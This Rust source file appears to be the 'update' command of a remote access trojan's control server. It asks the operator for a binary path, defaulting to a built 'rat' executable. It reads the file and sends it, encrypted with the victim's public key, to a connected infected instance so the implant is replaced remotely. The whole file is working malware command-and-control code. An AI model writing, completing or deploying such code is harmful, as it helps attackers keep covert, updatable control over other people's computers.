use std::borrow::Borrow;

use futures_util::TryFutureExt;
use tokio::{
    fs::{self, File},
    io::AsyncReadExt,
};

use crate::{
    connector_server::{
        hybrid_encryption::{self, encrypt_data_combined},
        instance::Instance,
    },
    server_cli,
};

#[derive(Debug, Clone)]

pub struct Update {
    name: String,
}

impl Update {
    pub fn new() -> Update {
        Update {
            name: "update".to_string(),
        }
    }
    pub fn get_name(&self) -> String {
        self.name.clone()
    }
    pub async fn run(&self, instance: &mut Instance) {
        let default_path = "<../../../../rat/target/release/rat";
        println!(
            "Input an update file or press enter for default: \n Default: {}",
            default_path
        );

        let path = server_cli::handle_user_input().await;
        let file_as_bytes = if path.as_str() == "" {
            self.open_file_as_bytes(default_path).await
        } else {
            self.open_file_as_bytes(path.as_str()).await
        };

        let public_key = instance.get_public_key();
        instance
            .send_hybrid_encryption(public_key.clone(), self.get_name().as_bytes().to_vec())
            .await;
        instance
            .send_hybrid_encryption(public_key.clone(), file_as_bytes)
            .await;
        println!("Update running");
    }
    pub async fn open_file_as_bytes(&self, path: &str) -> Vec<u8> {
        let mut file = File::open(path).await.unwrap();
        let mut plaintext = Vec::new();
        file.read_to_end(&mut plaintext).await.unwrap();
        plaintext
    }
}
